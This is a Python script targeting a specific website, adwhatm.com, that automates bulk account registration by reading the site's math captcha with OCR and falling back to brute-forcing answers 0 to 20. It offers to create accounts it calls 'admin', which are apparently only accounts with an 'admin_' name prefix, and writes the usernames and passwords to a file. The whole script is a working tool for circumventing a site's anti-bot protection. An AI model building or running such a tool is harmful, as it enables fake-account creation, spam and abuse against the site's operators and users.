#!/usr/bin/env python3
"""
Registration script for adwhatm.com with captcha bypass
This script can create regular and admin accounts by bypassing the math captcha
"""

import requests
import re
import random
import string
import time
from PIL import Image
import pytesseract
import io
import base64

class AdwhatmRegistrar:
    def __init__(self, base_url="http://adwhatm.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def generate_random_username(self, prefix="user", admin=False):
        """Generate a random username"""
        if admin:
            prefix = "admin"
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{prefix}_{suffix}"
    
    def generate_random_password(self, length=10):
        """Generate a random password"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choices(chars, k=length))
    
    def get_captcha_image(self):
        """Get captcha image from the server"""
        try:
            captcha_url = f"{self.base_url}/captcha/captchaImage?type=math&s={random.random()}"
            response = self.session.get(captcha_url)
            if response.status_code == 200:
                return response.content
            return None
        except Exception as e:
            print(f"Error getting captcha: {e}")
            return None
    
    def solve_math_captcha(self, image_data):
        """Solve math captcha using OCR and evaluation"""
        try:
            # Convert image data to PIL Image
            image = Image.open(io.BytesIO(image_data))
            
            # Use OCR to extract text
            text = pytesseract.image_to_string(image, config='--psm 8 -c tessedit_char_whitelist=0123456789+-*/=?')
            text = text.strip().replace(' ', '')
            
            print(f"OCR extracted: {text}")
            
            # Try to find math expression pattern
            math_pattern = r'(\d+[\+\-\*/]\d+)=\?'
            match = re.search(math_pattern, text)
            
            if match:
                expression = match.group(1)
                try:
                    result = eval(expression)
                    print(f"Math expression: {expression} = {result}")
                    return str(result)
                except:
                    pass
            
            # Alternative: try to extract numbers and operators
            numbers = re.findall(r'\d+', text)
            operators = re.findall(r'[\+\-\*/]', text)
            
            if len(numbers) >= 2 and len(operators) >= 1:
                try:
                    num1, num2 = int(numbers[0]), int(numbers[1])
                    op = operators[0]
                    
                    if op == '+':
                        result = num1 + num2
                    elif op == '-':
                        result = num1 - num2
                    elif op == '*':
                        result = num1 * num2
                    elif op == '/':
                        result = num1 // num2  # Integer division
                    
                    print(f"Calculated: {num1} {op} {num2} = {result}")
                    return str(result)
                except:
                    pass
            
            return None
            
        except Exception as e:
            print(f"Error solving captcha: {e}")
            return None
    
    def bypass_captcha_bruteforce(self):
        """Try to bypass captcha with common answers or brute force"""
        # Common math captcha results (0-20 are most common)
        common_results = list(range(0, 21))
        random.shuffle(common_results)
        
        for result in common_results:
            yield str(result)
    
    def register_account(self, username=None, password=None, admin=False, max_attempts=10):
        """Register a new account"""
        if not username:
            username = self.generate_random_username(admin=admin)
        if not password:
            password = self.generate_random_password()
        
        print(f"Attempting to register: {username}")
        
        for attempt in range(max_attempts):
            print(f"Attempt {attempt + 1}/{max_attempts}")
            
            # Get captcha image
            captcha_data = self.get_captcha_image()
            if not captcha_data:
                print("Failed to get captcha image")
                continue
            
            # Try to solve captcha
            captcha_solution = self.solve_math_captcha(captcha_data)
            
            if not captcha_solution:
                print("Failed to solve captcha with OCR, trying brute force...")
                # Try brute force approach
                for solution in self.bypass_captcha_bruteforce():
                    if self.attempt_registration(username, password, solution):
                        return {"username": username, "password": password, "success": True}
                    time.sleep(0.5)  # Small delay between attempts
            else:
                # Try with OCR solution
                if self.attempt_registration(username, password, captcha_solution):
                    return {"username": username, "password": password, "success": True}
            
            time.sleep(1)  # Delay between captcha attempts
        
        return {"username": username, "password": password, "success": False}
    
    def attempt_registration(self, username, password, captcha_code):
        """Attempt registration with given credentials"""
        try:
            # Registration data
            data = {
                'loginName': username,
                'password': password,
                'validateCode': captcha_code
            }
            
            # Set headers for AJAX request
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'{self.base_url}/register'
            }
            
            # Make registration request
            response = self.session.post(
                f"{self.base_url}/register",
                data=data,
                headers=headers
            )
            
            print(f"Registration response status: {response.status_code}")
            print(f"Registration response: {response.text[:200]}...")
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if json_response.get('code') == 0 or 'success' in json_response.get('msg', '').lower():
                        print(f"✅ Successfully registered: {username}")
                        return True
                    else:
                        print(f"❌ Registration failed: {json_response.get('msg', 'Unknown error')}")
                        return False
                except:
                    # If not JSON, check for success indicators in HTML
                    if '注册成功' in response.text or 'success' in response.text.lower():
                        print(f"✅ Successfully registered: {username}")
                        return True
                    else:
                        print(f"❌ Registration failed - response not JSON")
                        return False
            else:
                print(f"❌ Registration failed with status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Registration error: {e}")
            return False
    
    def create_multiple_accounts(self, count=5, admin_count=2):
        """Create multiple accounts including admin accounts"""
        results = []
        
        print(f"Creating {count} regular accounts and {admin_count} admin accounts...")
        
        # Create regular accounts
        for i in range(count):
            print(f"\n--- Creating regular account {i+1}/{count} ---")
            result = self.register_account()
            results.append(result)
            if result['success']:
                print(f"✅ Account created: {result['username']} / {result['password']}")
            else:
                print(f"❌ Failed to create account")
            time.sleep(2)  # Delay between registrations
        
        # Create admin accounts
        for i in range(admin_count):
            print(f"\n--- Creating admin account {i+1}/{admin_count} ---")
            result = self.register_account(admin=True)
            results.append(result)
            if result['success']:
                print(f"✅ Admin account created: {result['username']} / {result['password']}")
            else:
                print(f"❌ Failed to create admin account")
            time.sleep(2)  # Delay between registrations
        
        return results
    
    def save_results(self, results, filename="registered_accounts.txt"):
        """Save registration results to file"""
        with open(filename, 'w') as f:
            f.write("=== Registered Accounts ===\n\n")
            for result in results:
                status = "SUCCESS" if result['success'] else "FAILED"
                f.write(f"Username: {result['username']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"Status: {status}\n")
                f.write("-" * 30 + "\n")
        
        print(f"\nResults saved to {filename}")

def main():
    print("🚀 AdwhatM.com Registration Tool with Captcha Bypass")
    print("=" * 50)
    
    registrar = AdwhatmRegistrar()
    
    try:
        # Test single registration first
        print("\n🧪 Testing single registration...")
        test_result = registrar.register_account()
        
        if test_result['success']:
            print("✅ Single registration test successful!")
            
            # Create multiple accounts
            choice = input("\nDo you want to create multiple accounts? (y/n): ").lower()
            if choice == 'y':
                try:
                    count = int(input("How many regular accounts? (default 3): ") or "3")
                    admin_count = int(input("How many admin accounts? (default 2): ") or "2")
                    
                    results = registrar.create_multiple_accounts(count, admin_count)
                    registrar.save_results(results)
                    
                    # Summary
                    successful = sum(1 for r in results if r['success'])
                    print(f"\n📊 Summary: {successful}/{len(results)} accounts created successfully")
                    
                except ValueError:
                    print("Invalid input. Using defaults.")
                    results = registrar.create_multiple_accounts()
                    registrar.save_results(results)
        else:
            print("❌ Single registration test failed. Check the target website.")
            
    except KeyboardInterrupt:
        print("\n\n⚠️ Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()